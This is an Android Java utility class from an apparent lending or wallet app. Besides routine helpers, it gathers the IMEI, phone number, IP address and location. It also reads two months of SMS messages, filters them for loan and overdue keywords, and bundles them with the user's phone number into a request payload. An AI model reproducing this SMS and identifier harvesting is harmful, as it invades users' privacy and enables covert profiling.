package com.zhiyu.wallet.util;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.WindowManager;
import android.widget.TextView;


import com.zhiyu.wallet.bean.User;
import com.zhiyu.wallet.http.BasehttpModel;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import io.reactivex.functions.Consumer;

/**
 * 2018/7/12
 *
 * @author Mr.Luluxiu
 */

public class AppUtil {

    /**
     * 获取屏幕分辨率
     *
     * @param context
     * @return
     */
    public static int[] getScreenDispaly(Context context) {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        int width = windowManager.getDefaultDisplay().getWidth();// 手机屏幕的宽度
        int height = windowManager.getDefaultDisplay().getHeight();// 手机屏幕的高度
        int result[] = {width, height};
        return result;
    }


    /**
     * 日期转时间戳
     *
     * @param date
     * @param format
     */
    public static String date2TimeStamp(String date, String format) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat(format, Locale.CHINA);
            return String.valueOf(sdf.parse(date).getTime() );
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    /**
     * 时间戳转日期
     *
     * @param time
     * @param format
     */
    public static String timeStamp2Date(long time, String format) {
        if (format == null || format.isEmpty()) {
            format = "yyyy-MM-dd HH:mm:ss";
        }
        SimpleDateFormat sdf = new SimpleDateFormat(format);
        return sdf.format(new Date(time));
    }


    public static String CHANNELDATE = null;

    /**
     * 获取APK渠道号
     *
     * @param context
     * @param meta_key AndroidManifest定义的meta-data的name
     * @return
     */
    public static String getChannelData(Context context, String meta_key) {
        if (TextUtils.isEmpty(CHANNELDATE)) {
            if (context == null) {
                return null;
            }
            try {
                PackageManager packageManager = context.getPackageManager();
                if (packageManager != null) {
                    ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA);
                    if (applicationInfo != null) {
                        if (applicationInfo.metaData != null) {
                            CHANNELDATE = applicationInfo.metaData.getString(meta_key);
                        }
                    }
                }
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
        }
        return CHANNELDATE;
    }


    /**
     * 获取imei号
     *
     * @param context
     * @param meta_key AndroidManifest定义的meta-data的name
     * @return
     */
    private static String imei;

    public static Boolean isOpenPhoneState(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

            return false;
        } else {
            return true;
        }
    }

    public static String getBrand() {
        return Build.BRAND + ":" + Build.MODEL;
    }


    @SuppressLint({"MissingPermission", "HardwareIds"})
    public static String getImei(Context context) {
        if (!isOpenPhoneState(context)) {
            return "";
        }

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                for (int slot = 0; slot < telephonyManager.getPhoneCount(); slot++) {
                    imei = telephonyManager.getDeviceId(slot);
                }
                // System.out.println("111"+telephonyManager.getPhoneCount());
            } else {
                imei = telephonyManager.getDeviceId();
            }
        }
        return imei;
    }

    private static LocationManager myLocationManager;

    private static Context mcontext;

    private static Handler handler;

    private static String city = "";

    private static String specificLocation;

    private static Ongetlocation getlocationlisener;


    public static void startLocationlistener(Context activity, Ongetlocation ongetlocation) {
        if (!isOpenLocation(activity)) {
            return;
        }

        getlocationlisener = ongetlocation;
        locationListener.onLocationChanged(getLocation(activity));
    }


    public static boolean isOpenLocation(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            return false;
        } else {
            return true;
        }
    }

    /**
     * 获取GPS
     *
     * @param context
     * @return Location
     */
    @SuppressLint("MissingPermission")
    private static Location getLocation(Context context) {

        //获取位置管理服务
        myLocationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        mcontext = context;
        //查找服务信息
        Criteria criteria = new Criteria();
        criteria.setAccuracy(Criteria.ACCURACY_FINE); //定位精度: 最高
        criteria.setAltitudeRequired(false); //海拔信息：不需要
        criteria.setBearingRequired(false); //方位信息: 不需要
        criteria.setCostAllowed(true);  //是否允许付费
        criteria.setPowerRequirement(Criteria.POWER_LOW); //耗电量: 低功耗
        //String provider = myLocationManager.getBestProvider(criteria, true); //获取GPS信息
        //Location location = locationManager.getLastKnownLocation(provider); // 通过GPS获取位置
//        myLocationManager.requestLocationUpdates(provider,2000,5,locationListener);

        Location gpsLocation = null;
        Location netLocation = null;
        //myLocationManager.addGpsStatusListener(myListener);
        if (netWorkIsOpen()) {
            Println.out("开始获取","网络开了");
            myLocationManager.requestLocationUpdates("network", 200000, 1000, locationListener);
            netLocation = myLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }

        if (gpsIsOpen()) {

            //2000代表每2000毫秒更新一次，5代表每5米更新一次
            myLocationManager.requestLocationUpdates("gps", 200000, 1000, locationListener);
            gpsLocation = myLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        }

        if (gpsLocation == null && netLocation == null) {

            return null;
        }
        if (gpsLocation != null && netLocation != null) {
            if (gpsLocation.getTime() < netLocation.getTime()) {
                gpsLocation = null;
                return netLocation;
            } else {
                netLocation = null;
                return gpsLocation;
            }
        }
        if (gpsLocation == null) {
            return netLocation;
        } else {
            return gpsLocation;
        }
    }


    private static boolean netWorkIsOpen() {
        boolean isOpen = true;
        if (!myLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {//没有开启网络
            isOpen = false;
        }
        return isOpen;
    }

    private static boolean gpsIsOpen() {
        boolean isOpen = true;
        if (!myLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {//没有开启GPS
            isOpen = false;
        }
        return isOpen;
    }

    /**
     * 监听GPS位置改变后得到新的经纬度
     */
    private static LocationListener locationListener = new LocationListener() {
        @SuppressLint("HandlerLeak")
        public void onLocationChanged(final Location location) {
            //System.out.println("location "+location.toString() + "....");
            // TODO Auto-generated method stub
            if (location != null) {
                getAddress(mcontext, location);
                //获取国家，省份，城市的名称
                handler = new Handler() {
                    @Override
                    public void handleMessage(Message msg) {
                        super.handleMessage(msg);
                        List<Address> m_list = (List<Address>) msg.obj;
                        if (m_list != null && m_list.size() > 0) {
                            city = m_list.get(0).getLocality();//获取城市
                            specificLocation = m_list.get(0).getAddressLine(0); //获取具体位置
                        }

                        if (getlocationlisener != null) {
                            getlocationlisener.returnLocation(city, specificLocation);
                        }
                        //System.out.println("location:" + m_list.toString() + "\n" + "城市:" + city + "\n精度:" + location.getLongitude() + "\n纬度:" + location.getLatitude() + "\n定位方式:" + location.getProvider());
                    }
                };
//                new MyAsyncExtue().execute(location);
            } else {
                city = "无法获取定位";
                if (getlocationlisener != null) {
                    getlocationlisener.returnLocation(city, specificLocation);
                }
            }
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {

        }

        @Override
        public void onProviderEnabled(String provider) {

        }

        @Override
        public void onProviderDisabled(String provider) {

        }

    };

    public static String getCity() {
        return city;
    }

    public static String getSpecificLocation() {
        return specificLocation;
    }

    /**
     * 获取具体位置
     */
    private static void getAddress(final Context context, final Location location) {

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                List<Address> result = null;
                try {
                    if (location != null) {
                        Geocoder gc = new Geocoder(context, Locale.getDefault());
                        result = gc.getFromLocation(location.getLatitude(),
                                location.getLongitude(), 1);
                        Message msg = handler.obtainMessage();
                        msg.obj = result;
                        handler.sendMessage(msg);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();

    }

    public interface Ongetlocation {
        void returnLocation(String city, String SpecificLocation);
    }


    private static String IPAddress;

    public static void getIPAddress(Context context) {
        NetworkInfo info = ((ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (info != null && info.isConnected()) {
            if (info.getType() == ConnectivityManager.TYPE_MOBILE) {//当前使用2G/3G/4G网络
                try {
                    //Enumeration<NetworkInterface> en=NetworkInterface.getNetworkInterfaces();
                    for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                        NetworkInterface intf = en.nextElement();
                        for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                            InetAddress inetAddress = enumIpAddr.nextElement();
                            if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                                // return inetAddress.getHostAddress();
                                IPAddress = inetAddress.getHostAddress();
                            }
                        }
                    }
                } catch (SocketException e) {
                    e.printStackTrace();
                }

            } else if (info.getType() == ConnectivityManager.TYPE_WIFI) {//当前使用无线网络
                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String ipAddress = intIP2StringIP(wifiInfo.getIpAddress());//得到IPV4地址
                IPAddress = ipAddress;
                //return ipAddress;
            }
        } else {
            //当前无网络连接,请在设置中打开网络
        }
    }

    /**
     * 将得到的int类型的IP转换为String类型
     *
     * @param ip
     */
    private static String intIP2StringIP(int ip) {
        return (ip & 0xFF) + "." +
                ((ip >> 8) & 0xFF) + "." +
                ((ip >> 16) & 0xFF) + "." +
                (ip >> 24 & 0xFF);
    }

    public static String getIPAddress() {

        return IPAddress;
    }


    //获取电话号码
    @SuppressLint({"HardwareIds", "MissingPermission"})
    public static String getNativePhoneNumber(Context context) {
        if (!isOpenPhoneState(context)) {
            return "";
        }

        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String nativePhoneNumber = "N/A";
        nativePhoneNumber = telephonyManager.getLine1Number();
        return nativePhoneNumber;
    }

    @SuppressLint("HandlerLeak")
    public static void getMesContent(Context context) {


        handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);

            }
        };
        GetMesThread getMesThread = new GetMesThread(context);
        getMesThread.start();
    }

    public static class GetMesThread extends Thread{

        public Context mcontext;

        public GetMesThread(Context context){
            mcontext = context;
        }

        @Override
        public void run() {
            super.run();

            final String SMS_URI_ALL = "content://sms/"; // 所有短信
            final String SMS_URI_INBOX = "content://sms/inbox"; // 收件箱
            final String SMS_URI_SEND = "content://sms/sent"; // 已发送
            final String SMS_URI_DRAFT = "content://sms/draft"; // 草稿
            final String SMS_URI_OUTBOX = "content://sms/outbox"; // 发件箱
            final String SMS_URI_FAILED = "content://sms/failed"; // 发送失败
            final String SMS_URI_QUEUED = "content://sms/queued"; // 待发送列表

            StringBuilder smsBuilder = new StringBuilder();

            long late2 = Long.parseLong(date2TimeStamp(getLate(-2),"yyyy-MM-dd hh:mm:ss"));
            try {
                Uri uri = Uri.parse(SMS_URI_ALL);
                String[] projection = new String[]{"_id", "address", "person",
                        "body", "date", "type",};
                Cursor cur = mcontext.getContentResolver().query(uri, projection, "date>="+late2,
                        null, "date desc"); // 获取手机内部短信
                // 获取短信中最新的未读短信
                // Cursor cur = getContentResolver().query(uri, projection,
                // "read = ?", new String[]{"0"}, "date desc");
                List<Map<String ,Object > > mapList = new ArrayList<>();
                if (cur.moveToFirst()) {
                    int index_id = cur.getColumnIndex("_id");
                    int index_Address = cur.getColumnIndex("address");
                    int index_Person = cur.getColumnIndex("person");
                    int index_Body = cur.getColumnIndex("body");
                    int index_Date = cur.getColumnIndex("date");
                    int index_Type = cur.getColumnIndex("type");
                    do {
                        int id = cur.getInt(index_id);
                        String strAddress = cur.getString(index_Address);
                        int intPerson = cur.getInt(index_Person);
                        String strbody = cur.getString(index_Body);
                        long longDate = cur.getLong(index_Date);
                        int intType = cur.getInt(index_Type);

                        SimpleDateFormat dateFormat = new SimpleDateFormat(
                                "yyyy-MM-dd hh:mm:ss",Locale.CHINA);
                        Date d = new Date(longDate);
                        String strDate = dateFormat.format(d);

                        String strType = "";
                        if (intType == 1) {
                            strType = "接收";
                        } else if (intType == 2) {
                            strType = "发送";
                        } else if (intType == 3) {
                            strType = "草稿";
                        } else if (intType == 4) {
                            strType = "发件箱";
                        } else if (intType == 5) {
                            strType = "发送失败";
                        } else if (intType == 6) {
                            strType = "待发送列表";
                        } else if (intType == 0) {
                            strType = "所以短信";
                        } else {
                            strType = "null";
                        }
                        smsBuilder.append("[ ");
                        smsBuilder.append(id+", ");
                        smsBuilder.append(strAddress + ", ");
                        smsBuilder.append(intPerson + ", ");
                        smsBuilder.append(strbody + ", ");
                        smsBuilder.append(strDate + ", ");
                        smsBuilder.append(strType);
                        smsBuilder.append(" ]\n\n");

                        Map<String,Object> map = new HashMap<>();
                        map.put("_id",id);
                        map.put("address",strAddress);
                        map.put("person",intPerson);
                        map.put("body",strbody);
                        map.put("date",strDate);
                        map.put("type",strType);
                        if(strbody.contains("还款") || strbody.contains("到期") || strbody.contains("借款") ||strbody.contains("逾期")||strbody.contains("余额") ){
                            mapList.add(map);
                        }

                    } while (cur.moveToNext());

                        if (!cur.isClosed()) {
                            cur.close();
                            cur = null;
                        }

                } else {
                    smsBuilder.append("no result!");

                }
                Message message = handler.obtainMessage();
                BasehttpModel.Builder builder = new BasehttpModel.Builder();
                builder.addParam("phone", User.getInstance().getPhone());
                builder.addParams("message",mapList);
                message.obj =  builder.build().toString();
                handler.sendMessage(message);

                Println.out("getmes",smsBuilder.toString());

            } catch (SQLiteException ex) {
                Log.d("SQLiteException", ex.getMessage());
            }

        }
    }
    public static String getLate(int feture){
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.MONTH,feture);
        Date date = calendar.getTime();
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss",Locale.CHINA);
        String result = simpleDateFormat.format(date);
        return result;
    }



}
